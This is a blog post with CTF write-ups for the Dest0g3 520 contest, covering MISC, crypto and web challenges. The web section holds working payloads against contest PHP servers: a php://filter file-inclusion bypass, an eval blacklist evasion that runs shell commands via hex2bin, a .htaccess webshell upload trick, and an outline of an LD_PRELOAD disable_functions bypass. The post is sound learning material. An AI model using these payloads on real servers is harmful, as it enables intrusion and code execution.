<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"n9-zqc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="web题目只做了一部分">
<meta property="og:type" content="article">
<meta property="og:title" content="Dest0g3-520迎新赛">
<meta property="og:url" content="https://n9-zqc.github.io/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/index.html">
<meta property="og:site_name" content="N9-zqc">
<meta property="og:description" content="web题目只做了一部分">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/image-20220520124026360.png">
<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/image-20220524174126341.png">
<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/image-20220524230225794.png">
<meta property="og:image" content="https://n9-zqc.github.io/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/image-20220530220227446.png">
<meta property="article:published_time" content="2022-06-04T12:10:06.000Z">
<meta property="article:modified_time" content="2022-06-04T12:15:45.404Z">
<meta property="article:author" content="N9-zqc">
<meta property="article:tag" content="ctf秀平台">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n9-zqc.github.io/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/image-20220520124026360.png">

<link rel="canonical" href="https://n9-zqc.github.io/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>Dest0g3-520迎新赛 | N9-zqc</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">N9-zqc</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">有关网络安全的学习笔记</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-文章">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>文章</a>

  </li>
        <li class="menu-item menu-item-标签">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-查找">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>查找</a>

  </li>
        <li class="menu-item menu-item-关于">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://n9-zqc.github.io/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="N9-zqc">
      <meta itemprop="description" content="主要有关ctf的学习笔记,主攻逆向和Web">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="N9-zqc">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Dest0g3-520迎新赛
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-04 20:10:06 / Modified: 20:15:45" itemprop="dateCreated datePublished" datetime="2022-06-04T20:10:06+08:00">2022-06-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">ctf比赛</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>web题目只做了一部分</p>
<span id="more"></span>

<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Welcome-to-fxxking-DestCTF"><a href="#Welcome-to-fxxking-DestCTF" class="headerlink" title="Welcome to fxxking DestCTF"></a>Welcome to fxxking DestCTF</h4><p>下载下来重命名为.jpg即可获得二维码，发送就可以。</p>
<h4 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h4><p>1.lsb隐写得到密码。</p>
<p>2.binwalk -e 1.png  得到.zip文件解压即可。</p>
<h4 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h4><p>下载下来的文件摩斯密码解密，在转字符串，在ascii转文字即可。</p>
<h4 id="你知道js吗"><a href="#你知道js吗" class="headerlink" title="你知道js吗"></a>你知道js吗</h4><p>下载下来改为.zip并解压，找到document.xml,发现base64，base64解密，再Escape解密得到</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- </span><br><span class="line">&gt;-.-.- --.++ ++++.</span><br><span class="line">&gt;+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- </span><br><span class="line"></span><br><span class="line">&gt;&gt;---&lt; ]&gt;--- ---.+ ++++. -----</span><br><span class="line">&gt;&gt;.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.</span><br><span class="line">&gt;&gt;&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+</span><br><span class="line">&gt;&gt; +++++ .---- -.++. ++.+.</span><br><span class="line">&gt;&gt;--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- </span><br><span class="line">&gt;&gt;.+.-. ---.+ ++.+. -.+++</span><br><span class="line">&gt;&gt;+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---</span><br><span class="line">&gt;&gt;-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ </span><br><span class="line">&gt;&gt;.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.</span><br><span class="line">&gt;&gt;+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ </span><br><span class="line">&gt;&gt;.---- .+.++ ++.-- --.++</span><br><span class="line">&gt;&gt;++.-. ----. +.-.+ ++++. </span><br><span class="line">&gt;&gt;&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p> Brainfuck解密得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</span><br></pre></td></tr></table></figure>

<p>16进制转字符串得到</p>
<p>Dest0g3{86facac9-0a5d-4047-b702-86cb37ab77b2}</p>
<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h4><p><img src="/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/image-20220520124026360.png" alt="image-20220520124026360"></p>
<h4 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">password = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span> <span class="comment">#秘钥，b就是表示为bytes类型</span></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span> <span class="comment"># iv偏移量，bytes类型</span></span><br><span class="line">text = <span class="string">b&#x27;abcdefghijklmnhi&#x27;</span> <span class="comment">#需要加密的内容，bytes类型</span></span><br><span class="line"><span class="comment"># AES.MODE_CBC 表示模式是CBC模式</span></span><br><span class="line">en_text = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(password,AES.MODE_CBC,iv) <span class="comment">#CBC模式下解密需要重新创建一个aes对象</span></span><br><span class="line">den_text = aes.decrypt(en_text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文：&quot;</span>,den_text)</span><br><span class="line"><span class="comment">#明文： b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()</span></span><br><span class="line"><span class="string">x = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">g = 19</span></span><br><span class="line"><span class="string">p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line"><span class="string">h = pow(g, x, p)</span></span><br><span class="line"><span class="string">print(h)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line">y = <span class="number">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">x = discrete_log(mod(y, p), mod(g, p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(x))</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/image-20220524174126341.png" alt="image-20220524174126341"></p>
<p>得到0x446573743067337b30376564326136662d313832662d613035642d633831652d3133313861663832306137387d</p>
<p>两个数字一组可以组成一个字符</p>
<p>得到Dest0g3{07ed2a6f-182f-a05d-c81e-1318af820a78}</p>
<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h4><p>绕过不能重复包含文件的限制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload:/?file=php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br><span class="line"></span><br><span class="line">PD9waHANCiRmbGFnID0gIkRlc3QwZzN7NmI5MTM5MTUtMWZjNS00MDllLThkOTUtZTIzZGNmYjk2MDZmfSI7DQo=</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;Dest0g3&#123;6b913915-1fc5-409e-8d95-e23dcfb9606f&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>



<h4 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = date(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = date(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">set_error_handler(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$fl4g</span></span>) </span>&#123;  <span class="comment">//传入是数组类型，自动调用</span></span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">Try</span> harder!Dest0g3&#123;<span class="number">9</span>da534fb-<span class="number">81</span>ea-<span class="number">4255</span>-bcfc-<span class="number">68</span>ad9d5b0d51&#125;</span><br></pre></td></tr></table></figure>

<p>payload：post提交</p>
<p>ctf[]=1</p>
<h4 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_ireplace(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span> Dest0g3&#123;<span class="number">43</span>b2548a-<span class="number">9</span>ab4-<span class="number">4220</span>-<span class="number">96</span>dc-<span class="number">60</span>a8e61b6f7c&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload: 	</span><br><span class="line"></span><br><span class="line">aaa=hex2bin(<span class="string">&#x27;73797374656d&#x27;</span>)(<span class="string">&#x27;ls /&#x27;</span>);</span><br><span class="line"></span><br><span class="line">bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br><span class="line"></span><br><span class="line">aaa=hex2bin(<span class="string">&#x27;73797374656d&#x27;</span>)(<span class="string">&#x27;head /?la*&#x27;</span>);</span><br><span class="line"></span><br><span class="line">得到Dest0g3&#123;<span class="number">43</span>b2548a-<span class="number">9</span>ab4-<span class="number">4220</span>-<span class="number">96</span>dc-<span class="number">60</span>a8e61b6f7c&#125;</span><br></pre></td></tr></table></figure>

<h4 id="funny-upload-这道题出的特别好（绕过disable-functions）"><a href="#funny-upload-这道题出的特别好（绕过disable-functions）" class="headerlink" title="funny_upload 这道题出的特别好（绕过disable_functions）"></a>funny_upload 这道题出的特别好（绕过disable_functions）</h4><p>1.javascript前端过滤，下载javascript禁用插件，火狐浏览器可以通过网址输入about:config，搜索javascript.enabled改为false即可禁止javascript。</p>
<p>2.尝试上传.php文件，发现上传失败，测试发现文件名含有.php及其大小写，直接禁止上传，文件内容含有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?,&lt;?php,?&gt;</span><br></pre></td></tr></table></figure>

<p>也是直接禁止上传。</p>
<p>3.经过测试.htaccess文件名可以上传，但是因为其上传过滤以上文件，那么可以使用.htaccess对上传文件进行base64解密，以此绕过以上文字过滤。</p>
<p>.htaccess文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .abc</span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=shell.abc&quot;</span></span><br></pre></td></tr></table></figure>

<p>4.下一步就比较细了，发现base64解密后，含有&lt;? 和&lt;?php的一律直接过滤，直接就不显示，还好&lt;?=是可以的。</p>
<p>上传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=phpinfo();?&gt;的base64可以得到以下页面</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/image-20220524230225794.png" alt="image-20220524230225794"></p>
<p>发现其过滤了很多函数，但是Linux环境下的 putenv(),mail()是可以使用的。</p>
<p>所以用利用环境变量LD_PRELOAD绕过：</p>
<p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
<p>项目地址<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD: bypass disable_functions via LD_PRELOA (no need /usr/sbin/sendmail) (github.com)</a></p>
<p>基本原理：</p>
<p>通过环境变量 LD_PRELOAD 劫持系统函数，来突破 disable_functions 限制执行操作系统命令</p>
<p>利用过程：</p>
<p> bypass_disablefunc.php和bypass_disablefunc_x64.so上传到目标服务器</p>
<p>执行命令：</p>
<p>#cmd:执行的命令</p>
<p>#outpath:读写权限目录</p>
<p>#sopath:so文件的绝对路径</p>
